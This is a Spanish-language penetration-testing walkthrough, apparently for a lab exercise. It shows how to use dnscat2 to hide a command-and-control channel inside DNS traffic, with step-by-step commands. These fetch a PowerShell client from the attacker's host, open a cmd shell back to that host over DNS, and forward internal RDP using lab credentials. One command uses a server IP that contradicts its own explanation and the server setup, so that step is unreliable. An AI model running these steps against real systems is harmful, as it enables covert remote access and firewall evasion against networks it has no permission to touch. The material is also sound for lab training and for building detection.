
## 🧠 Concepto clave

Dnscat2 es una herramienta de tunneling que usa el **protocolo DNS como canal de comunicación encubierto** entre dos hosts. En lugar de enviar datos a través de TCP/HTTP como chisel o socat, encapsula los datos dentro de peticiones y respuestas DNS — específicamente en registros TXT. El canal es cifrado extremo a extremo con una clave precompartida.

La idea se basa en una realidad de las redes corporativas: casi ningún firewall bloquea DNS (UDP/53) porque romper DNS rompe toda la resolución de nombres. Aunque el firewall bloquee HTTP, HTTPS, SSH y cualquier otro protocolo, el tráfico DNS casi siempre pasa.
```
[Windows objetivo]                    [Atacante 10.10.14.18]
dnscat2.ps1                           dnscat2 server (Ruby)
    │                                       │
    │  peticiones DNS TXT para              │
    │  inlanefreight.local      ──────────► │ puerto UDP 53
    │  (datos encapsulados)                 │
    │  ◄────────────────────────────────── │
    │  respuestas DNS TXT                   │
    │  (comandos / datos)                   │
```

| Herramienta | Transporte | Bloqueable por firewall | Cifrado |
|---|---|---|---|
| chisel | HTTP/WebSocket | Sí (si bloquean HTTP) | Opcional TLS |
| rpivot | HTTP | Sí (si bloquean HTTP) | No |
| ssh -D | SSH TCP 22 | Sí | Sí siempre |
| **dnscat2** | **DNS UDP 53** | **Muy difícil — rompe la red** | **Sí siempre** |

> [!info] **dnscat2** 📄 [github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2)
> Herramienta de C2 y tunneling que encapsula datos arbitrarios dentro del protocolo DNS. Funciona en modo cliente-servidor: el servidor corre en el atacante escuchando en UDP/53, el cliente corre en el objetivo y envía peticiones DNS al servidor. Los datos viajan dentro de registros TXT de peticiones DNS aparentemente legítimas. El canal es cifrado con una clave precompartida negociada al inicio de la sesión. Incluye funcionalidades de C2 completas: múltiples sesiones, shells interactivas, port forwarding, y transferencia de archivos.

> [!info] **dnscat2-powershell** 📄 [github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
> Cliente dnscat2 implementado en PowerShell puro — sin necesidad de compilar ni descargar binarios adicionales en el objetivo Windows. Compatible con el servidor Ruby de dnscat2. Al ser PowerShell nativo, tiene menor probabilidad de ser detectado por AV que un binario compilado externo.

---

## 📌 Cómo funciona el tunneling DNS

En un entorno corporativo con Active Directory, hay un servidor DNS interno que resuelve nombres del dominio. Cuando un host no puede resolver un nombre internamente, reenvía la petición hacia servidores DNS externos — y ese tráfico normalmente no está inspeccionado en profundidad.

Dnscat2 aprovecha esto: el cliente en el objetivo envía peticiones DNS para subdominios del dominio controlado por el atacante (por ejemplo `a1b2c3d4.inlanefreight.local`). Esos datos en el subdominio son en realidad datos encapsulados. El servidor DNS autoritativo para `inlanefreight.local` es el atacante, que recibe las peticiones, decodifica los datos, y responde con más datos encapsulados en registros TXT.
```
Cliente DNS del objetivo pregunta:
  "¿Cuál es la IP de [DATOS_CODIFICADOS].inlanefreight.local?"

Servidor dnscat2 del atacante responde:
  TXT: "[MÁS_DATOS_CODIFICADOS]"

→ Comunicación bidireccional completa usando solo tráfico DNS
```

---

## 📌 Paso 1 — Configurar el servidor dnscat2 en el atacante

> [!tip] Clonar dnscat2 e instalar dependencias Ruby
> ```bash
> git clone https://github.com/iagox86/dnscat2.git
> cd dnscat2/server/
> sudo gem install bundler
> sudo bundle install
> ```
>
> `git clone` — Descarga el repositorio completo de dnscat2 incluyendo el servidor Ruby y el cliente C.
> `cd dnscat2/server/` — El servidor Ruby está en el subdirectorio `server/`.
> `sudo gem install bundler` — Instala Bundler, el gestor de dependencias de Ruby. Necesario para resolver e instalar las gemas (librerías) que usa dnscat2.
> `sudo bundle install` — Lee el `Gemfile` del proyecto e instala todas las dependencias Ruby necesarias para ejecutar el servidor.

> [!tip] Iniciar el servidor dnscat2 en el atacante
> ```bash
> sudo ruby dnscat2.rb \
>     --dns host=10.10.14.18,port=53,domain=inlanefreight.local \
>     --no-cache
> ```
>
> `sudo ruby dnscat2.rb` — Ejecuta el servidor con privilegios de root — necesario para escuchar en el puerto 53 (puerto privilegiado < 1024).
> `--dns host=10.10.14.18` — IP del atacante donde el servidor DNS de dnscat2 escuchará las peticiones entrantes del cliente.
> `port=53` — Puerto UDP estándar de DNS. Usar el puerto estándar maximiza la probabilidad de que el tráfico atraviese firewalls sin inspección.
> `domain=inlanefreight.local` — Dominio para el que el servidor actuará como autoridad DNS. Las peticiones del cliente para subdominios de `inlanefreight.local` serán interceptadas y procesadas como datos del túnel.
> `--no-cache` — Deshabilita el caché de respuestas DNS — importante para que cada petición sea procesada individualmente y los datos no se cacheen incorrectamente.

Al arrancar, el servidor genera y muestra la **clave precompartida** que el cliente deberá usar:
```
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

> [!important] La clave precompartida (`0ec04a91cd1e963f8c03ca499d589d21`) es única por cada sesión del servidor. **Debe copiarse exactamente** — se usará para autenticar y cifrar la comunicación con el cliente. Si cliente y servidor no tienen la misma clave, la sesión no se establece.

---

## 📌 Paso 2 — Preparar el cliente dnscat2 en PowerShell

> [!tip] Clonar dnscat2-powershell en el atacante para transferirlo al objetivo
> ```bash
> # En el atacante
> git clone https://github.com/lukebaggett/dnscat2-powershell.git
> ```

Transferir el archivo `dnscat2.ps1` al host Windows objetivo usando cualquiera de los métodos habituales (servidor HTTP Python, SMB, etc.):

> [!tip] Levantar servidor HTTP para servir el script PowerShell al objetivo
> ```bash
> # En el atacante
> cd dnscat2-powershell
> python3 -m http.server 8080
> ```

> [!tip] Descargar dnscat2.ps1 en el objetivo Windows
> ```powershell
> # En el Windows objetivo
> Invoke-WebRequest -Uri "http://10.10.14.18:8080/dnscat2.ps1" -OutFile "C:\Windows\Temp\dnscat2.ps1"
> ```
>
> `-Uri "http://10.10.14.18:8080/dnscat2.ps1"` — URL del script en el servidor HTTP del atacante.
> `-OutFile "C:\Windows\Temp\dnscat2.ps1"` — Ruta de destino en el objetivo. `C:\Windows\Temp` es una ubicación habitual que suele tener permisos de escritura para usuarios sin privilegios.

---

## 📌 Paso 3 — Importar y ejecutar el cliente en el objetivo Windows

> [!tip] Importar el módulo dnscat2 en PowerShell
> ```powershell
> # En el Windows objetivo
> Import-Module .\dnscat2.ps1
> ```
>
> `Import-Module` — Carga el script PowerShell como módulo, haciendo disponibles todos los cmdlets y funciones que define — en este caso `Start-Dnscat2`.

> [!tip] Establecer el túnel DNS enviando una CMD shell al servidor
> ```powershell
> Start-Dnscat2 -DNSserver 10.10.14.22 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
> ```
>
> `-DNSserver 10.10.14.18` — IP del servidor dnscat2 del atacante. Las peticiones DNS del cliente se enviarán directamente a esta IP en lugar de al servidor DNS corporativo interno.
> `-Domain inlanefreight.local` — Dominio que se usará para construir las peticiones DNS del túnel. Debe coincidir con el `domain=` configurado en el servidor.
> `-PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21` — Clave precompartida generada por el servidor al iniciarse. Autentica la sesión y cifra el canal de comunicación.
> `-Exec cmd` — Especifica qué ejecutar en el túnel: una shell `cmd.exe` interactiva cuya entrada/salida viajará cifrada dentro del tráfico DNS hacia el atacante. Alternativa: `-Exec powershell` para una shell PowerShell.

---

## 📌 Paso 4 — Interactuar con la sesión desde el servidor

El servidor confirma la sesión establecida y cifrada:
```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
dnscat2>
```

> [!tip] Listar las opciones y comandos disponibles en dnscat2
> ```bash
> dnscat2> ?
> ```
>
> Comandos principales disponibles: `window` (gestionar sesiones), `windows` (listar sesiones activas), `tunnels` (gestionar port forwards), `kill` (terminar una sesión), `set/unset` (configurar parámetros).

> [!tip] Interactuar con la sesión shell establecida
> ```bash
> dnscat2> window -i 1
> ```
>
> `window -i 1` — Cambia al **interactive window** número 1 — la sesión CMD del objetivo Windows. Todo lo que se escriba se envía como comandos al `cmd.exe` del objetivo, y las respuestas llegan de vuelta cifradas dentro de respuestas DNS.
> Para volver al prompt de dnscat2 sin cerrar la sesión: `Ctrl+Z`.

Una vez dentro de la sesión:
```
Microsoft Windows [Version 10.0.18363.1801]
C:\Windows\system32>
```

Se tiene acceso completo a una shell CMD en el objetivo Windows, con todo el tráfico encapsulado en DNS.

---

## 📌 Port forwarding a través del túnel DNS

Además de shells interactivas, dnscat2 soporta port forwarding a través del canal DNS — permitiendo acceder a servicios internos desde el atacante usando el túnel como transporte.

> [!tip] Crear un port forward a través del túnel dnscat2
> ```bash
> # En el prompt de dnscat2
> dnscat2> window -i 1
> # Dentro de la sesión:
> listen 127.0.0.1:8888 172.16.5.19:3389
> ```
>
> `listen 127.0.0.1:8888` — Puerto local en el atacante donde quedará disponible el port forward.
> `172.16.5.19:3389` — Host y puerto de destino en la red interna del objetivo — accesible desde el Windows comprometido.

> [!tip] Conectar al servicio interno a través del port forward DNS
> ```bash
> # En el atacante — el tráfico viaja encapsulado en DNS
> xfreerdp /v:127.0.0.1:8888 /u:victor /p:pass@123
> ```

---

## 📌 Limitaciones de dnscat2

> [!important] Limitaciones a tener en cuenta antes de usar dnscat2
> - **Velocidad muy baja** — DNS no está diseñado para transferir datos arbitrarios. El ancho de banda efectivo del túnel es muy limitado (típicamente unos pocos KB/s). No es viable para transferencias de archivos grandes ni para tráfico intensivo.
> - **Latencia alta** — Cada petición DNS tiene su propio round-trip. Operaciones interactivas como shells pueden sentirse lentas comparado con SSH o chisel.
> - **Requiere servidor DNS autoritativo** — Para que el dominio usado (`inlanefreight.local`) resuelva hacia el atacante en entornos reales de Internet, el atacante debe ser el servidor DNS autoritativo para ese dominio. En laboratorios HTB esto está ya configurado.
> - **Detectable por DNS inspection** — Soluciones de seguridad avanzadas como DNS Security (Infoblox, Cisco Umbrella) analizan el volumen y la entropía de las peticiones DNS para detectar tunneling. Un volumen anormalmente alto de peticiones TXT para un dominio desconocido es una señal de alerta clara.
> - **Solo funciona con dominio propio** — A diferencia de chisel que solo necesita un puerto TCP abierto, dnscat2 requiere control sobre un dominio DNS para que las peticiones lleguen al servidor del atacante.

---

## 🔗 Relaciones / Contexto

Dnscat2 es la herramienta de último recurso cuando todos los demás métodos de pivoting fallan: SSH bloqueado, HTTP bloqueado, HTTPS con inspección SSL, puertos altos bloqueados. Si el entorno tiene inspección profunda de paquetes que descifra HTTPS y analiza el contenido, dnscat2 es prácticamente el único vector que queda — junto con ICMP tunneling. En entornos corporativos reales con Active Directory, el hecho de que DNS sea imprescindible para el funcionamiento de AD hace que bloquearlo completamente sea inviable, lo que garantiza que el canal siempre estará disponible. El precio es la velocidad y la complejidad de setup — dnscat2 es ideal para C2 persistente y exfiltración de datos pequeños, no para pivoting intensivo de red.